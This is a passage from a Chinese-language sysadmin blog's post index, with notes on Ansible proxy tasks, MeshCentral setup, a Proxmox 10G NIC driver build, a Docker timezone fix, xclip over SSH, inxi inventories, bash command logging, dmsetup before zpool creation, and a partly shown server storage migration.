no_proxy=\u0026#34;localhost,127.0.0.1,192.168.1.1/16,.def.com.tw,.abc.com\u0026#34; when: ansible_default_ipv4.address in iuser_ip_list # remove proxy when user not in iuser_list - name: remove proxy from /etc/environment blockinfile: path: /etc/environment marker: \u0026#34;#{mark} ANSIBLE MANAGED BLOCK#\u0026#34; block: \u0026#34;\u0026#34; when: ansible_default_ipv4.address not in iuser_ip_list 因為只比對 ip ，所以結果就是一翻兩瞪眼，有在裡面就跑第一個task ，沒有就跑第二個\n不過呢， proxy server 那邊的playbook 也弄好了， client 這邊也知道怎麼跑了\n但是，讓user可以透過proxy server 存取internet 的簽呈還是一直沒有下來 \u0026hellip;.\n都什麼年代了，還有半數以上的client 無法存取internet\n我實在是想不透啊..\n","date":"2019-07-23T15:06:37+08:00","permalink":"https://h.cowbay.org/post/ansible-run-task-depends-on-ipaddr/","title":"[ansible] 用 ip 位置判斷是否要執行task /ansible run task depends on ipaddr"},{"content":"在ansible中，關於如何引用自定義的變數，一直讓我很頭疼\n尤其是有牽涉到從外部導入yaml檔案時，更是常常讓我不知道到底該怎麼抓出想要的變數\n這次還是用selectattr 來處理，希望下次能夠記得\u0026hellip;\n首先是導入的yaml檔案，內容長這樣\nclient_hosts: abc.com: - host: hqdc021 ipv4: 192.168.11.21 - host: hqdc022 ipv4: 192.168.11.22 - host: hqdc023 ipv4: 192.168.11.23 - host: hqdc024 ipv4: 192.168.11.24 - host: hqdc025 iuser: True ipv4: 192.168.11.25 user: [yangj] - host: hqdc026 ipv4: 192.168.11.26 user: [changp, joy] - host: hqdc027 ipv4: 192.168.11.27 xyz.com: - host: dc021 iuser: True ipv4: 192.168.1.21 user: [tim] - host: dc022 ipv4: 192.168.1.22 - host: dc023 ipv4: 192.168.1.23 - host: dc024 ipv4: 192.168.1.24 - host: dc025 ipv4: 192.168.1.25 user: [eric] - host: dc026 ipv4: 192.168.1.26 user: [erica] - host: dc027 ipv4: 192.168.1.27 在playbook中，首先先導入這個檔案\n- name: load client_host include_vars: file: client_hosts.yml name: ch 然後用這個剛剛導入的檔案，去做出想要的清單\n像底下這個，就是指定了client_hosts的 abc.com 這個域名底下，iuser有被定義的資料，再轉成list\n- name: get internet user list set_fact: iuser_list: \u0026#34;{{ ch[\u0026#39;client_host\u0026#39;][\u0026#39;abc.com\u0026#39;]|selectattr(\u0026#39;iuser\u0026#39;,\u0026#39;defined\u0026#39;)|list }}\u0026#34; 然後就可以用來做condition了\n- name: copy environment block to /etc/environment copy: content: | PATH=\u0026#34;/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games\u0026#34; all_proxy=\u0026#34;{{ proxy_env }}\u0026#34; http_proxy=\u0026#34;{{ proxy_env }}\u0026#34; https_proxy=\u0026#34;{{ proxy_env }}\u0026#34; no_proxy=\u0026#34;localhost,127.0.0.1,192.168.1.1/16,.xyz.com,.abc.com\u0026#34; dest: /etc/environment when: item.ipv4 == ansible_default_ipv4.address with_items: \u0026#34;{{ iuser_list }}\u0026#34; ","date":"2019-07-01T09:06:12+08:00","permalink":"https://h.cowbay.org/post/ansible-selectattr-from-list-in-dictionary/","title":"[ansible] 引用事先定義好的yaml檔裡面的變數 - Ansible Selectattr From List in Dictionary file"},{"content":"之前在LAN/windows環境下，一直都是用ultravnc/winvnc/tigervnc之類的VNC軟體\n但是如果要過 internet ，就會碰到各種開port的問題\n在這種環境下，就有了當時 teamviewer 的橫空出世\n解決了開PORT的問題，讓被控端(通常是資訊技術相對弱勢，需要接受幫助的一方)不需要懂太多\n只要下載teamviewer被控端，開啟後報ID 給協助者就好了\n好景不常\u0026hellip;ㄟ，好像也不能這麼說\nteamviewer 是一套商業授權軟體，要買license的\n不知道用什麼方式偵測，一開始可以用，但是後來會出現視窗警告，再來就不讓你用了。\n於是又有了 anydesk 的出現\nanydesk 的定義就是免費軟體，所以沒有授權問題\n可是 anydesk 在初期有頗多狀況，比如像是windows的UAC，或者是畫面反應速度過慢\n又或者是常常自動變成view only ，無法操作的狀況\n當使用者需要讓我用anydesk連線進去時，通常就已經是電腦有些什麼狀況了\n然後還要面對anydesk的種種問題，實在是讓人很抓狂！\n終於某次因緣際會，讓我找到了這篇的主角\nMeshcentral 簡單介紹一下Meshcentral 的優點\n安全性高 teamviewer \u0026amp; anydesk 之所以不需要開port，就是被控/遙控兩邊都是先連線到他們提供的伺服器(通常在國外)\n有人會擔心這樣畫面會不會被擷取之類的 我是認為想太多了啦，但就真的有人會擔心這種問題啊(嘆\nmeshcentral則不同，他是安裝在LAN的機器上(當然，要跨WAN也可以，就開port吧)\n所以原則上從server到client這段的連線，都是在LAN中加密進行，不會有需要上傳到廠商伺服器的問題\n自然安全性就高了很多\n速度快 如同前面所述，因為都在LAN中進行，不需要透過廠商在國外的Server，所以操作的速度很快！\n操作簡單 一開始meshcentral 會需要在client 安裝agent，在比較早期一點的版本，這個動作需要先用anydesk連上被控端\n然後去開啟連結、以管理者權限進行安裝\n新版改善了這個問題，可以直接產生一個invite url ，直接發信給user ，請user去點連結進行安裝\n當然要先做好安裝步驟說明就是了，不然windows會判斷這個是有問題的檔案，不讓執行\n裝完之後，被控端就不會再看到這東西了(所以也無從關閉，除非從service.msc 去stop)\n而且也不會碰到煩人的UAC訊息跳出來時，畫面上的按鈕無法點選的問題(anydesk就有這種狀況，需要透過config去排除)\n安裝容易 meshcentral的安裝很簡單，在ubuntu 18.04 server 的環境底下執行以下指令\n#install nodejs/npm sudo apt install nodejs npm #make meshcentral working folder sudo mkdir -p /opt/meshcentral #install meshcentral cd /opt/meshcentral;npm install meshcentral # start meshcentral cd /opt/meshcentral/node_modules/meshcentral;node meshcentral --cert {{ servier_ip_address }} 這樣就把meshcentral安裝\u0026amp;啟動了\n應該是可以改用systemd or supervisor 來控制了，那個是另外的部份了\nMeshcentral 簡易操作說明 meshcentral 在操作上也很簡單，第一次安裝成功後，開啟meshcentral的頁面\n首先建立一個管理者帳號，接著用管理者帳號進入後，建立一個group\n然後進入這個group ，會看到一個 invite的連結\n點擊invite之後，會詢問要產生多長有效時間的連結，如果很懶，就直接選unlimited\n然後把這串URL記下來，發給所有user(最好自己先run過一遍，做一份安裝步驟一起發給使用者)\n等到user照說明，安裝agent之後，在管理界面上就會看到client出現了\n有亮起來的圖示就代表client online ，可以直接進去操作\n操作畫面可以操考以下影片，我是透過internet(兩邊都是CHT雙向100) 去控制遠端電腦播放youtube\n可以看到畫面是非常地流暢！\n總結 這麼好用的系統，還不快去裝一套起來！\n","date":"2019-06-20T11:03:12+08:00","permalink":"https://h.cowbay.org/post/remote-management-system-meshcentral/","title":"linux底下遠端遙控\u0026管理的好用系統 Meshcentral / Remote Management \u0026 control system Meshcentral"},{"content":"前幾天接的一個case\n因為費用的關係，所以沒有考慮用傳統定義上的伺服器(DELL R640)\n改採用比較高階一點的洋垃圾，規格大概是 Intel E5-2680V2 x2 + 64G RAM + 128G SSD x2 (OS) + 960G SSD x4 (raid 10 , zfs)\nstorage 選擇QNAP NAS TS-932X + 960G SSD x 4 (raid 10 , NFS) + QNAP 10G Switch QSW-1280C-8C\n既然storage這邊選用了10G的機種，伺服器上當然也要增加10G網卡\n一樣，成本考量，就不用INTEL 了，買了這張 ASUS 10G 網卡\nhttps://24h.pchome.com.tw/prod/DRAF01-A90088CKR\n結果\u0026hellip;. debian9 預設抓不到這張卡啊！\n本來想說要退貨了，想想還是先google 好了，還真的有人碰到一樣的問題\n底下就大概說一下怎麼解決\n###安裝相關套件###\n登入proxmox 主機後，執行以下指令安裝套件\napt install linux-headers build-essential git make gcc 然後馬上就卡關了 XD\nroot@pve:~# apt install linux-headers Reading package lists... Done Building dependency tree Reading state information... Done Package linux-headers is a virtual package provided by: pve-headers-4.15.3-1-pve 4.15.3-1 pve-headers-4.15.18-9-pve 4.15.18-30 pve-headers-4.15.18-8-pve 4.15.18-28 pve-headers-4.15.18-7-pve 4.15.18-27 pve-headers-4.15.18-6-pve 4.15.18-25 pve-headers-4.15.18-5-pve 4.15.18-24 pve-headers-4.15.18-4-pve 4.15.18-23 pve-headers-4.15.18-3-pve 4.15.18-22 pve-headers-4.15.18-2-pve 4.15.18-21 pve-headers-4.15.18-15-pve 4.15.18-40 pve-headers-4.15.18-14-pve 4.15.18-39 pve-headers-4.15.18-13-pve 4.15.18-37 pve-headers-4.15.18-12-pve 4.15.18-36 pve-headers-4.15.18-11-pve 4.15.18-34 pve-headers-4.15.18-10-pve 4.15.18-32 pve-headers-4.15.18-1-pve 4.15.18-19 pve-headers-4.15.17-3-pve 4.15.17-14 pve-headers-4.15.17-2-pve 4.15.17-10 pve-headers-4.15.17-1-pve 4.15.17-9 pve-headers-4.15.15-1-pve 4.15.15-6 pve-headers-4.15.10-1-pve 4.15.10-4 pve-headers-4.13.8-3-pve 4.13.8-30 pve-headers-4.13.8-2-pve 4.13.8-28 pve-headers-4.13.8-1-pve 4.13.8-27 pve-headers-4.13.4-1-pve 4.13.4-26 pve-headers-4.13.3-1-pve 4.13.3-2 pve-headers-4.13.16-4-pve 4.13.16-51 pve-headers-4.13.16-3-pve 4.13.16-50 pve-headers-4.13.16-2-pve 4.13.16-48 pve-headers-4.13.16-1-pve 4.13.16-46 pve-headers-4.13.13-6-pve 4.13.13-42 pve-headers-4.13.13-5-pve 4.13.13-38 pve-headers-4.13.13-4-pve 4.13.13-35 pve-headers-4.13.13-3-pve 4.13.13-34 pve-headers-4.13.13-2-pve 4.13.13-33 pve-headers-4.13.13-1-pve 4.13.13-31 pve-headers-4.10.8-1-pve 4.10.8-7 pve-headers-4.10.5-1-pve 4.10.5-5 pve-headers-4.10.17-5-pve 4.10.17-25 pve-headers-4.10.17-4-pve 4.10.17-24 pve-headers-4.10.17-3-pve 4.10.17-23 pve-headers-4.10.17-2-pve 4.10.17-20 pve-headers-4.10.17-1-pve 4.10.17-18 pve-headers-4.10.15-1-pve 4.10.15-15 pve-headers-4.10.11-1-pve 4.10.11-9 pve-headers-4.10.1-2-pve 4.10.1-2 You should explicitly select one to install. E: Package \u0026#39;linux-headers\u0026#39; has no installation candidate root@pve:~# 改用以下套件名稱安裝### apt install pve-headers-4.15.18-15-pve build-essential git make gcc 第一個套件會隨著pve版本不同有所變化，所以要看當下執行時，系統提供的訊息來決定\n我是用清單內最新的版本\n接著把驅動程式 clone 回來\ngit clone https://github.com/Aquantia/AQtion.git 參考 README\nhttps://github.com/Aquantia/AQtion/blob/master/README.txt\n進入目錄後開始編譯\nmake 編譯完，應該就能看到網卡了，不過我是還有重開機\n順便貼一下10G網路的速度，感覺還真的\u0026hellip;..不怎麼樣 \u0026hellip;.\n不過在做 backup/restore 的時候，感覺是比之前其他沒有10G環境要快\n反正這樣子買下來的硬體設備也不算太貴(比一台新的R640還便宜)\n就先這樣子跑吧，至於洋垃圾的穩定度，就觀察看看吧..\n","date":"2019-06-17T13:20:57+08:00","permalink":"https://h.cowbay.org/post/install-asus-10g-nic-in-proxmox/","title":"Install Asus 10G NIC XG-C100C in Proxmox"},{"content":"最近一直在玩一些docker，不過老是會碰到歪果扔寫的東西，時區都不一致\n有的用 UTC，有的用localtime，就是沒碰到用 Asia/Taipei 的\u0026hellip;.\n之前因為沒有要上線，所以這個問題可以當烏龜忽略過去\n不過測試了一陣子的librenms 打算正式上線了\n又不想重作一次，導致累積滿久的圖表資料都消失\n所以開始找尋方法來面對這個問題\n本來看了這篇 https://www.arthurtoday.com/2016/07/how-to-setup-docker-container-timezone-host.html\n想說來試試看好了\n不過呢，一開始依照這篇的說明，在docker-compose.yml 內加入\nweb: image: jarischaefer/docker-librenms hostname: librenms ports: - \u0026#34;8001:80\u0026#34; - \u0026#34;44301:443\u0026#34; volumes: - /etc/hosts:/etc/hosts - /etc/localtime:/etc/localtime:ro environment: - TZ=\u0026#34;Asia/Taipei\u0026#34; 重起之後沒作用 0rz\n於是我又加入了\nvolumes: - /etc/hosts:/etc/hosts - /etc/localtime:/etc/localtime:ro - /etc/timezone:/etc/timezone:ro 結果啟動直接報錯誤了..\n看一下 log\nMay 21 09:09:12 bbs012 syslog-ng[12]: syslog-ng starting up; version=\u0026#39;3.13.2\u0026#39; *** Running /etc/my_init.d/librenms_100_cron... *** Running /etc/my_init.d/librenms_101_ssl... *** Running /etc/my_init.d/librenms_102_ipv6... *** Running /etc/my_init.d/librenms_103_timezone... /etc/my_init.d/librenms_103_timezone: line 4: /etc/timezone: Read-only file system *** /etc/my_init.d/librenms_103_timezone failed with status 1 *** Killing all processes... 所以這個檔案不能改成 ro ，不過如果不能唯獨，那啟動docker的時候應該會被蓋掉吧？\n先來看一下那個 librenms_103_timezone 在幹什麼好了\ndocker exec -it librenms_web_1 cat /etc/my_init.d/librenms_103_timezone #!/bin/bash -e if [ -n \u0026#34;$TZ\u0026#34; ]; then ln -snf /usr/share/zoneinfo/$TZ /etc/localtime \u0026amp;\u0026amp; echo $TZ \u0026gt; /etc/timezone if [ ! -f /etc/php/7.3/cli/conf.d/100-timezone.ini ]; then echo \u0026#34;date.timezone=$TZ\u0026#34; \u0026gt; /etc/php/7.3/cli/conf.d/100-timezone.ini fi if [ ! -f /etc/php/7.3/fpm/conf.d/100-timezone.ini ]; then echo \u0026#34;date.timezone=$TZ\u0026#34; \u0026gt; /etc/php/7.3/fpm/conf.d/100-timezone.ini fi fi 2019-05-21 17:33:46 [mini@s013 librenms]$ OK ，這裡的確是用傳進來的 $TZ 在設定timezone 沒錯\n可是我前面已經改過 docker-compose.yml\n有把 TZ帶進來了啊？再來確認一下\ndocker exec -it librenms_web_1 cat /etc/timezone \u0026#34;Asia/Taipei\u0026#34; 咦，沒錯啊？ 欸斗，等等，那兩個 \u0026quot;\u0026quot; 有點刺眼\u0026hellip;\n跟本機的比對一下看看\n2019-05-21 17:36:20 [mini@s013 librenms]$ docker exec -it librenms_web_1 cat /etc/timezone \u0026#34;Asia/Taipei\u0026#34; 2019-05-21 17:36:23 [mini@s013 librenms]$ cat /etc/timezone Asia/Taipei 2019-05-21 17:37:10 [mini@s013 librenms]$ 嗯，的確，本機的格式的確不包含那兩個 \u0026quot;\u0026quot;\n那就改掉再來試試看吧\u0026hellip;改成底下這樣\nenvironment: - TZ=Asia/Taipei 重起 docker ，然後確認時間看看\n2019-05-21 17:39:00 [mini@s013 librenms]$ docker-compose down;docker-compose up -d Stopping librenms_web_1 ... done Stopping librenms_mysql_1 ... done Removing librenms_web_1 ... done Removing librenms_mysql_1 ... done Removing network librenms_default Creating network \u0026#34;librenms_default\u0026#34; with the default driver Creating librenms_mysql_1 ... done Creating librenms_web_1 ... done 2019-05-21 17:39:22 [mini@s013 librenms]$ docker exec -it librenms_web_1 cat /etc/timezone Asia/Taipei 2019-05-21 17:39:42 [mini@s013 librenms]$ docker exec -it librenms_web_1 date Tue May 21 17:39:48 CST 2019 2019-05-21 17:39:48 [mini@s013 librenms]$ OK ，果然沒有問題了！\n雖然是小小的\u0026quot;\u0026quot; ，還是要特別注意啊！\n","date":"2019-05-21T17:25:15+08:00","permalink":"https://h.cowbay.org/post/change-timezone-in-docker/","title":"[筆記] 修改 docker 容器內的時區 - Change Timezone in Docker"},{"content":"工作上常會需要用ssh登入遠端主機檢查LOG，有必要的時候，還要把log複製回本機來處理。\n以前都是傻傻的用 scp 傳檔案\n之前就記得有這個xclip/xsel 可以用，但是一直沒有弄清楚怎麼執行\n早上研究了一下，順便做個筆記。\n1. ssh 要加上 -X 不然會出現\nError: Can\u0026#39;t open display: (null) 這種錯誤訊息\n-X Enables X11 forwarding. This can also be specified on a per-host basis in a configuration file. X11 forwarding should be enabled with caution. Users with the ability to bypass file permissions on the remote host (for the user\u0026#39;s X authorization database) can access the local X11 display through the forwarded connection. An attacker may then be able to perform activi‐ ties such as keystroke monitoring. For this reason, X11 forwarding is subjected to X11 SECURITY extension restrictions by default. Please refer to the ssh -Y option and the ForwardX11Trusted directive in ssh_config(5) for more information. 2. remote 主機要安裝 xclip / xsel 2019-05-17 10:12:20 [minion@hqs019 ~]$ sudo apt install xsel Reading package lists... Done Building dependency tree Reading state information... Done The following NEW packages will be installed: xsel 0 upgraded, 1 newly installed, 0 to remove and 73 not upgraded. Need to get 19.0 kB of archives. After this operation, 47.1 kB of additional disk space will be used. Get:1 http://ftp.tw.debian.org/ubuntu bionic/universe amd64 xsel amd64 1.2.0-4 [19.0 kB] Fetched 19.0 kB in 0s (80.3 kB/s) Selecting previously unselected package xsel. (Reading database ... 161032 files and directories currently installed.) Preparing to unpack .../xsel_1.2.0-4_amd64.deb ... Unpacking xsel (1.2.0-4) ... Processing triggers for man-db (2.8.3-2ubuntu0.1) ... Setting up xsel (1.2.0-4) ... 2019-05-17 10:13:32 [minion@hqs019 ~]$ sudo apt install xclip Reading package lists... Done Building dependency tree Reading state information... Done The following NEW packages will be installed: xclip 0 upgraded, 1 newly installed, 0 to remove and 73 not upgraded. Need to get 17.5 kB of archives. After this operation, 52.2 kB of additional disk space will be used. Get:1 http://ftp.tw.debian.org/ubuntu bionic/main amd64 xclip amd64 0.12+svn84-4build1 [17.5 kB] Fetched 17.5 kB in 1s (16.2 kB/s) Selecting previously unselected package xclip. (Reading database ... 161038 files and directories currently installed.) Preparing to unpack .../xclip_0.12+svn84-4build1_amd64.deb ... Unpacking xclip (0.12+svn84-4build1) ... Setting up xclip (0.12+svn84-4build1) ... Processing triggers for man-db (2.8.3-2ubuntu0.1) ... 3.執行方式 執行以下指令，就可以把遠端的檔案內容傳送到「系統剪貼簿」，在本機就可以直接貼上了\ncat copy_neonexus.csv |xclip -selection clipboard ","date":"2019-05-17T12:18:54+08:00","permalink":"https://h.cowbay.org/post/transfer-file-content-using-xclip-in-terminal/","title":"Transfer File Content Using Xclip in Terminal"},{"content":"最近因為一直碰到硬碟故障的問題，算起來那一批同時購買的5X顆 seagate 2T硬碟，已經有一半以上故障返修了\u0026hellip;.\n然後又因為一直沒有添購新的硬碟，只能用這些快過保/已過保的撐著\n所以最近不斷的在更換機器內的硬碟，而且還沒有熱插拔！\n也導致原本負責處理盤點資產的同事困擾，因為跟手邊的紀錄已經對不起來了\n然後就變成要對資產的時候，需要一台一台登入，然後去下不同的指令，取得想要的硬體資訊，超級麻煩的！\n幾次之後，終於決定透過ansible來做這件事\n一開始的想法很簡單，就用 lshw/dmidecode這些指令去做\n可是因為手邊的機器有ubuntu 18.04/16.04/14.04 , Debian 9 , Proxmox (based on debian ) , CentOS , FreeNAS\n而有些系統預設沒有 lshw / dmidecode (對，FreeNAS 就是說你)\n所以變成要依照系統不同，去下不同的指令，雖然都是ansible在跑，但是看到playbook的內容就很煩啊！\n然後就不小心讓我翻到了 inxi 這個指令，根本就是救星啊！\n直接來看輸出的範例\n有沒有，是不是很優！\n而且簡單易懂，還能抓到同事想看的資料，像是廠牌、型號、序號、記憶體類型(DDR2/3/4)\n所以馬上捨棄 lshw/dmidecode ，改用 inxi 來跑\nansible role 的內容也很簡單\n就偵測完之後，把結果送出給設定好的收件人\n只是因為系統不同，大致上要分成 ubuntu/debian/centos 以及 freebsd 兩種\n所以同樣的task 要跑兩次，一個要帶sudo 一個不用帶\n然後BSD系列的機器，在inventory 裡面要帶入 ansible_ssh_user\n就這樣，沒有什麼太困難的\n######### use inxi instead ################## - name: copy inxi binary to remote Ubnutu/Debian become: yes become_method: sudo copy: src: inxi dest: /usr/local/bin/inxi mode: a+rx,u+rwx when: ansible_distribution == \u0026#34;Ubuntu\u0026#34; or ansible_distribution == \u0026#34;Debian\u0026#34; or ansible_distribution == \u0026#34;CentOS\u0026#34; - name: copy inxi binary to remote FreeBSD copy: src: inxi dest: /usr/local/bin/inxi mode: a+rx,u+rwx when: ansible_distribution == \u0026#34;FreeBSD\u0026#34; - name: run inxi to collect Ubuntu/Debian hardware info become: yes become_method: sudo shell: \u0026#34;/usr/local/bin/inxi -c -Dxx -C -m -Z\u0026#34; register: du_hw_info when: ansible_distribution == \u0026#34;Ubuntu\u0026#34; or ansible_distribution == \u0026#34;Debian\u0026#34; or ansible_distribution == \u0026#34;CentOS\u0026#34; - name: run inxi to collect FreeBSD hardware info shell: \u0026#34;/usr/local/bin/inxi -c -Dxx -C -m -Z\u0026#34; register: bsd_hw_info when: ansible_distribution == \u0026#34;FreeBSD\u0026#34; - name: set Ubuntu/Debian inventory file template: src: etc/inventory.txt.j2 dest: \u0026#34;/tmp/{{ ansible_hostname }}_inventory.txt\u0026#34; mode: a+r,u+rw when: ansible_distribution == \u0026#34;Ubuntu\u0026#34; or ansible_distribution == \u0026#34;Debian\u0026#34; or ansible_distribution == \u0026#34;CentOS\u0026#34; - name: set FreeBSD inventory file template: src: etc/freenas_inventory.txt.j2 dest: \u0026#34;/tmp/{{ ansible_hostname }}_inventory.txt\u0026#34; mode: a+r,u+rw when: ansible_distribution == \u0026#34;FreeBSD\u0026#34; - name: send inventory file via mail tags: mail mail: host: 192.168.11.173 port: 25 secure: starttls subject: \u0026#34;{{ ansible_hostname }} inventory file\u0026#34; from: ansible to: \u0026#34;{{ recipient }}\u0026#34; #body: \u0026#34;{{ mail_body.stdout_lines }}\u0026#34; attach: \u0026#34;/tmp/{{ ansible_hostname }}_inventory.txt\u0026#34; inventory 內容\nhqs01.abc.com ansible_ssh_host=192.168.11.1 hqs210.abc.com hqs230.abc.com hqs231.abc.com hqs234.abc.com hqs03.abc.com hqs020.abc.com hqs019.abc.com hqs010.abc.com hqs05.abc.com hqs173.abc.com ###BSD Hosts ### hqs099.abc.com ansible_ssh_host=192.168.11.99 ansible_ssh_port=22 ansible_ssh_user=root hqs202.abc.com ansible_ssh_host=192.168.11.202 ansible_ssh_port=22 ansible_ssh_user=root bbs089.abc.com ansible_ssh_host=192.168.0.89 ansible_ssh_user=root ansible 又發揮了一次，另外，感覺這個指令可以用來寫資產管理系統耶\u0026hellip;威力強大\n而且又不用管作業系統是什麼，反正有執行檔，直接派過去 remote 端就好了！\n真是讓我相見恨晚啊！\n","date":"2019-04-23T15:28:56+08:00","permalink":"https://h.cowbay.org/post/inx-collect-detail-hardware-info/","title":"[筆記] inxi 蒐集詳盡的硬體資訊 / inxi Collect Detail Hardware Info"},{"content":"今天發生一件有點詭異的事情，本來應該要經過某個指令才會產生的檔案\n居然不知為何自己產生了，在我記憶中沒有去執行過那個指令\n翻了一下 bash_history ，裡面也只有下過哪些指令，沒有紀錄時間，完全沒有參考價值(攤手)\n所以翻了一下網路，至少把這兩台主要跑ansible的機器的log功能補上紀錄所有指令以及時間的部份\n參考這個網頁 我沒有打算要紀錄「所有」使用者的指令，只要看有權力執行重要指令的帳號就好\n所以先用minion(管理用的帳戶)登入後\n先編輯 ~/.bashrc 加入\nexport PROMPT_COMMAND=\u0026#39;RETRN_VAL=$?;logger -p local6.debug \u0026#34;$(whoami) [$$]: $(history 1 | sed \u0026#34;s/^[ ]*[0-9]\\+[ ]*//\u0026#34; ) [$RETRN_VAL]\u0026#34;\u0026#39; 因為這邊用到syslog 的 local6，所以要跟著修改 syslog的設定\nsudo vim /etc/rsyslog.d/bash.conf 加入這行 local6.* /var/log/commands.log 接著設定讓/var/log/commands.log 也能夠自動輪替 sudo vim /etc/logrotate.d/rsyslog 在適當的位置 加入 /var/log/commands.log 然後重起 rsyslog sudo service rsyslog restart 用 minion 登出登入後，就可以看到所有指令都被完整的紀錄下來了\nsudo cat /var/log/commands.log 2019-04-23 15:18:48 [minion@hqs010 ~]$ sudo cat /var/log/commands.log Apr 23 15:06:51 hqs010 minion: minion [30832]: [0] Apr 23 15:06:53 hqs010 minion: minion [30832]: ls -lart [0] Apr 23 15:06:55 hqs010 minion: minion [30832]: ls -alrt /tmp/ [0] Apr 23 15:06:58 hqs010 minion: minion [30832]: ls -lart /var/log/ [0] Apr 23 15:07:07 hqs010 minion: minion [30832]: sudo cat /var/log/commands.log [0] Apr 23 15:07:13 hqs010 minion: minion [30832]: ls -lart /tmp/ [0] Apr 23 15:07:18 hqs010 minion: minion [30832]: cat /tmp/hqs010_inventory.txt [0] Apr 23 15:07:22 hqs010 minion: minion [30832]: cd [0] Apr 23 15:07:22 hqs010 minion: minion [30832]: ls [0] Apr 23 15:07:24 hqs010 minion: minion [30832]: ls -lart [0] Apr 23 15:07:28 hqs010 minion: minion [30832]: ls .inxi/ [0] Apr 23 15:07:35 hqs010 minion: minion [30832]: clear [0] Apr 23 15:18:48 hqs010 minion: minion [30832]: ip addr [0] 2019-04-23 15:18:55 [minion@hqs010 ~]$ 裡面應該會看到滿滿的 cd / ls / cat 吧 XD\n","date":"2019-04-23T15:08:36+08:00","permalink":"https://h.cowbay.org/post/log-all-bash-commands/","title":"[筆記] 紀錄所有下過的指令、時間 / Log All commands with timestamp"},{"content":"今天把其中一台proxmox 加上10G 光纖網卡，準備和另一台proxmox 組成10G 環境進行測試\n想說把本機的zpool 拆掉，重新建立一個raid0 的空間來做clone/migrate\n可是一直出現device busy的錯誤訊息\nroot@pve:~# zpool create zp sdb1 cannot open \u0026#39;/dev/sdb1\u0026#39;: Device or resource busy 可是我沒有mount 這個分割進來\n而且我也可以用fdisk 去切sdb ，代表sdb 沒有真的被使用\n找了很久，終於找到這個dmsetup指令\n先用 dmsetup info -C 來看現在的狀態\nroot@pve:~# dmsetup info -C Name Maj Min Stat Open Targ Event UUID ST2000DM001-1ER164_W4Z3KKJB 253 3 L--w 0 1 0 mpath-ST2000DM001-1ER164_W4Z3KKJB pve-swap 253 0 L--w 2 1 0 LVM-6Hle5UGjtr8NQQsbMrYlSdGXZklwAi87Kq9NlzQa6xvgiHOEP3Ekx72i5yYNaupf pve-root 253 1 L--w 1 1 0 LVM-6Hle5UGjtr8NQQsbMrYlSdGXZklwAi87geZeFZsQsgYUbI1ZJU4lKD86TVd1MNrq ST2000DM001-1ER164_W4Z3KM2F-part1 253 5 L--w 0 1 0 part1-mpath-ST2000DM001-1ER164_W4Z3KM2F ST2000DM001-1ER164_W4Z3KM2F 253 2 L--w 1 1 0 mpath-ST2000DM001-1ER164_W4Z3KM2F ST2000DM001-1ER164_W4Z3GYNJ 253 4 L--w 0 1 0 mpath-ST2000DM001-1ER164_W4Z3GYNJ 除了那兩個LVM開頭的以外，其他都不應該出現在這裡才對 移除掉應該就可以了 要照順序，像那個有part1 的，就要先移掉，才能移掉底層\nroot@pve:~# dmsetup remove ST2000DM001-1ER164_W4Z3KM2F-part1 root@pve:~# dmsetup remove ST2000DM001-1ER164_W4Z3KM2F root@pve:~# dmsetup remove ST2000DM001-1ER164_W4Z3KKJB root@pve:~# dmsetup remove ST2000DM001-1ER164_W4Z3KM2F root@pve:~# dmsetup remove ST2000DM001-1ER164_W4Z3GYNJ 再來建立zpool 就 OK了\nroot@pve:~# zpool create zp sdb sdc sdd root@pve:~# zpool status pool: zp state: ONLINE scan: none requested config: NAME STATE READ WRITE CKSUM zp ONLINE 0 0 0 sdb ONLINE 0 0 0 sdc ONLINE 0 0 0 sdd ONLINE 0 0 0 errors: No known data errors root@pve:~# ","date":"2019-04-01T15:56:27+08:00","permalink":"https://h.cowbay.org/post/fix-zpool-device-busy-using-dmsetup/","title":"[筆記] 解決無法建立zpool 的錯誤 / Fix Zpool Device Busy Using dmsetup"},{"content":"公司的一台老伺服器空間不足了，要執行指令都會中斷，所以想要擴充空間。\n看起來不難搞，事實上\u0026hellip;..\n因為前人的功績，所以這台當初的磁碟分割有點「特別」！\n實體硬碟是兩顆500G SATA\n然後各切三個 partition (sda1/sda2/sda3 and sdb1/sdb2/sdb3)\nsda2/sdb2 用250M 來組 raid1 (/dev/md0) 給 /boot 用\nsda1/sdb1 各用40G 組raid1 (/dev/md1) 做成LVM 的VG ，然後再切出四個大小不同的分割\n* / (sysvg-root) * /usr (sysvg-usr) * /var (sysvg-var) * /tmp (sysvg-tmp) What the Fuck !?!? 然後最好笑的是，40G的空間，還留了2G，可以讓後面的倒楣鬼(對，就是我)\n在碰到空間不足的問題時，還可以「擴充」\n然後剩下的sda3/sdb3 大概有四百多G空間，一樣是組raid1 然後分割給這些目錄用\n* /data (datavg-datatest) (對的，沒有錯 真的叫 datavg-datatest，媽的你test個鬼啊！還在test的東西直接上線使用？) * /web (datavg-web) * /www (datavg-www) * /home (datavg-home) 幹！誰可以告訴我 www/web 的差異在哪裡？為什麼要特別切兩個分割給這兩個目錄用？\n快下班了，明天再來寫\u0026hellip;\n繼續補坑..\n先說結論，最後成功的作法如下\n加裝一顆512G SSD 到機器上 安裝作業系統(centos 6.2) 到 512G SSD，裝完後用SSD開機，進入系統後，先補完一些套件(lvm2,rsync等等) 在系統內直接偵測原先的raid (mdadm \u0026ndash;assemble \u0026ndash;scan) 執行 vgchange -ay 啟動 lvm，原來的lv 會出現在 /dev/mapper/xxxxxx 先備份 /etc , /usr (usr 應該可以不用備份) mount /dev/mapper/xxxxxx /mnt，然後把資料抄到SSD的相對路徑裡面 sysvg-usr\u0026ndash;\u0026gt;usr sysvg-var\u0026ndash;\u0026gt;var datavg-datatest\u0026ndash;\u0026gt;data (幹，再罵一次，test個什麼鬼！) 都抄完之後，把剛剛備份的/etc_backup 裡面的fstab 複製回 /etc ，這樣才能正常開機 重新開機，祈禱可以開起來 進入系統後，測試相關程式 這次的過程，踩了很多坑\u0026hellip;\n導致中間有一段時間一直在鑽牛角尖，想要把問題解掉，加上沒有適合的硬體，就連新買的 1TB SSD 也是地雷\n所以花了三天才算成功\n簡單紀錄一下碰到了哪些問題，以及對應的解決方式(如果有得解的話)..\n加裝兩顆硬碟後，原系統無法使用 這個問題非常奇怪，因為空間不足嘛，所以很直接就想說加硬碟進去擴充空間好了。\n結果加了兩顆500G SATA硬碟之後，原有的系統雖然可以開機，但是 SSH 